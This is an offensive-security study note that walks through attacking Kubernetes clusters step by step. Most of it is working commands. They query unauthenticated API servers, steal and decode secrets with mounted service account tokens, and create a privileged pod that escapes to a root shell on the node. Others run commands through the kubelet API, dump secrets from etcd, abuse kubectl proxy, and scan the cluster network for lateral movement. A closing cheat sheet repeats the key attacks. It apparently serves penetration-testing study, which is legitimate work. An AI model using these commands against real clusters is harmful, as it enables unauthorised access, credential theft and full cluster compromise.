# 04.5 — Kubernetes Attack Techniques

## What This Note Covers

Step-by-step Kubernetes attack techniques: unauthenticated API server access, service account token abuse, pod escape to node, etcd direct access, kubectl proxy abuse, and lateral movement through the cluster.

---

## Attack 1: Unauthenticated API Server

The Kubernetes API server on port 6443 (HTTPS) or 8080 (HTTP, legacy) is the central control plane. In misconfigured clusters, it can be accessible without authentication.

```bash
# Check if API server is accessible
curl -k https://TARGET:6443/api/v1/namespaces
# -k skips TLS verification

# Check for anonymous access
curl -k https://TARGET:6443/api/v1/pods
# 200 OK → anonymous access enabled

# Check version (often allows anonymous)
curl -k https://TARGET:6443/version

# List all API groups
curl -k https://TARGET:6443/apis

# If anonymous access allowed — enumerate everything
curl -k https://TARGET:6443/api/v1/namespaces
curl -k https://TARGET:6443/api/v1/pods
curl -k https://TARGET:6443/api/v1/secrets
curl -k https://TARGET:6443/api/v1/configmaps
curl -k https://TARGET:6443/api/v1/serviceaccounts
```

> [!warning] Port 8080 — the completely open API
> The old insecure port 8080 requires no auth and no TLS. If found open, the cluster is fully exposed. Modern K8s deprecated it but old clusters or misconfigurations still have it.

```bash
# HTTP port — completely unauthenticated
curl http://TARGET:8080/api/v1/secrets
curl http://TARGET:8080/api/v1/namespaces/kube-system/secrets
```

## Attack 2: Service Account Token Abuse

Every pod has a service account token automatically mounted. This token authenticates to the K8s API server.

### Step 1: Get the Token (from Inside a Pod)

```bash
# Token path
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
APISERVER=https://kubernetes.default.svc

# Verify API server is reachable
curl --cacert $CACERT \
  --header "Authorization: Bearer $TOKEN" \
  $APISERVER/version
```

### Step 2: Enumerate What the Token Can Do

```bash
# Check permissions
curl --cacert $CACERT \
  --header "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NAMESPACE/pods

# Self-subject access review (what can I do?)
curl --cacert $CACERT \
  --header "Authorization: Bearer $TOKEN" \
  --header "Content-Type: application/json" \
  -X POST \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews \
  -d '{
    "apiVersion": "authorization.k8s.io/v1",
    "kind": "SelfSubjectAccessReview",
    "spec": {
      "resourceAttributes": {
        "namespace": "default",
        "verb": "list",
        "resource": "secrets"
      }
    }
  }'
# "allowed": true → you can list secrets
```

### Step 3: Steal Secrets if Permitted

```bash
# List all secrets in namespace
curl --cacert $CACERT \
  --header "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NAMESPACE/secrets

# Get a specific secret and decode
SECRET=$(curl --cacert $CACERT \
  --header "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NAMESPACE/secrets/db-credentials)

echo $SECRET | python3 -c "
import sys, json, base64
data = json.load(sys.stdin)['data']
for k, v in data.items():
    print(f'{k}: {base64.b64decode(v).decode()}')
"
```

## Attack 3: Pod Escape to Node

Once inside a pod with sufficient permissions, you can create a new privileged pod that mounts the host filesystem — escaping to the underlying node.

### Via kubectl (if you have `create pods` permission)

```bash
# Create an escape pod (if you have kubectl and pod creation rights)
kubectl apply -f - <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: escape-pod
  namespace: default
spec:
  hostPID: true
  hostNetwork: true
  containers:
  - name: escape
    image: alpine
    command: ["/bin/sh", "-c", "sleep 3600"]
    securityContext:
      privileged: true
    volumeMounts:
    - name: host-root
      mountPath: /host
  volumes:
  - name: host-root
    hostPath:
      path: /
EOF

# Exec into the escape pod
kubectl exec -it escape-pod -- chroot /host /bin/bash
# Root shell on the node
```

### Via API Server Directly (no kubectl)

```bash
# Create the escape pod via REST API
curl --cacert $CACERT \
  --header "Authorization: Bearer $TOKEN" \
  --header "Content-Type: application/json" \
  -X POST \
  $APISERVER/api/v1/namespaces/default/pods \
  -d '{
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {"name": "escape"},
    "spec": {
      "hostPID": true,
      "hostNetwork": true,
      "containers": [{
        "name": "escape",
        "image": "alpine",
        "command": ["/bin/sh", "-c", "sleep 3600"],
        "securityContext": {"privileged": true},
        "volumeMounts": [{"name": "host", "mountPath": "/host"}]
      }],
      "volumes": [{"name": "host", "hostPath": {"path": "/"}}]
    }
  }'

# Exec into it
curl --cacert $CACERT \
  --header "Authorization: Bearer $TOKEN" \
  -X POST "$APISERVER/api/v1/namespaces/default/pods/escape/exec?container=escape&command=/bin/sh&stdin=true&stdout=true&tty=true"
```

## Attack 4: kubelet API Abuse

The kubelet runs on every worker node and has its own API on port 10250 (authenticated) and 10255 (read-only, unauthenticated — legacy).

```bash
# Check unauthenticated read-only kubelet port (10255)
curl http://NODE_IP:10255/pods
# Lists all pods on this node — no auth required

# Authenticated kubelet API (10250)
# If anonymous auth is enabled on kubelet:
curl -k https://NODE_IP:10250/pods
curl -k https://NODE_IP:10250/metrics

# Execute commands via kubelet API (if anonymous auth enabled)
# This bypasses the API server entirely
curl -k -X POST https://NODE_IP:10250/run/NAMESPACE/POD_NAME/CONTAINER_NAME \
  -d "cmd=id"

# Execute on a running container
curl -k -X POST https://NODE_IP:10250/exec/NAMESPACE/POD_NAME/CONTAINER_NAME?command=id
```

> [!danger] Kubelet with anonymous auth = exec on any pod without RBAC check
> If `--anonymous-auth=true` is set on the kubelet (old default), the API server's RBAC is bypassed. You can execute commands in any pod on that node directly.

## Attack 5: etcd Direct Access

etcd is the key-value store that holds **all** cluster state — every pod definition, every secret, every config, every RBAC policy. Direct access to etcd = complete cluster compromise.

```bash
# etcd listens on port 2379 (TLS) or 2380 (peer)
# Direct access requires client certificates (or misconfigured open access)

# Check if etcd is accessible
curl https://TARGET:2379/version  # likely needs certs

# With etcd client (if you have the certificates — often found on control plane nodes)
ETCDCTL_API=3 etcdctl \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/healthcheck-client.crt \
  --key=/etc/kubernetes/pki/etcd/healthcheck-client.key \
  get / --prefix --keys-only

# Get all Kubernetes secrets from etcd (plaintext if no encryption at rest)
ETCDCTL_API=3 etcdctl \
  --endpoints=https://127.0.0.1:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get /registry/secrets --prefix

# The output is binary but secrets are embedded as plaintext
# Pipe through strings to extract readable content
ETCDCTL_API=3 etcdctl ... get /registry/secrets --prefix | strings | grep -A2 "password\|token\|key"
```

## Attack 6: kubectl proxy Abuse

`kubectl proxy` creates a local HTTP proxy to the K8s API server. If running, it provides unauthenticated local access to the full API.

```bash
# If kubectl proxy is running (common in dev environments)
# Typically on localhost:8001

curl http://localhost:8001/api/v1/secrets
curl http://localhost:8001/api/v1/namespaces/kube-system/secrets
```

## Lateral Movement in Kubernetes

Once inside one pod, move to other pods or namespaces.

### Using Stolen SA Token to Access Other Namespaces

```bash
# Check if current SA token has cross-namespace access
curl --cacert $CACERT \
  --header "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/production/secrets

# If cluster-level permissions: access all namespaces
curl --cacert $CACERT \
  --header "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/secrets  # all secrets, all namespaces
```

### Network-Based Lateral Movement

By default, Kubernetes has no network policy — all pods can talk to all other pods across all namespaces.

```bash
# From inside a pod — scan the cluster network
# Service CIDR typically 10.96.0.0/12
# Pod CIDR varies by CNI

# Discover services via DNS
nslookup kubernetes.default.svc.cluster.local
nslookup db.production.svc.cluster.local

# Scan for open services
for i in $(seq 1 254); do
  nc -zv 10.96.0.$i 80 2>/dev/null && echo "10.96.0.$i:80 open"
done

# Or use nmap if available
nmap -sT 10.96.0.0/16 -p 80,443,3306,5432,6379,27017 --open
```

## Quick Reference — Kubernetes Attacks

```bash
# Unauthenticated API access
curl -k https://TARGET:6443/api/v1/secrets
curl http://TARGET:8080/api/v1/secrets  # legacy HTTP

# From inside pod — get token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

# Check permissions
curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/default/pods

# List secrets
curl --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/secrets

# Escape pod (if you have create pods)
kubectl run escape --image=alpine --privileged \
  --overrides='{"spec":{"hostPID":true,"volumes":[{"name":"h","hostPath":{"path":"/"}}],"containers":[{"name":"escape","image":"alpine","command":["sleep","3600"],"volumeMounts":[{"name":"h","mountPath":"/host"}],"securityContext":{"privileged":true}}]}}'
kubectl exec -it escape -- chroot /host /bin/bash

# kubelet API
curl -k https://NODE_IP:10250/pods
curl http://NODE_IP:10255/pods

# Permission check
kubectl auth can-i --list
kubectl auth can-i exec pods
kubectl auth can-i get secrets --all-namespaces
```
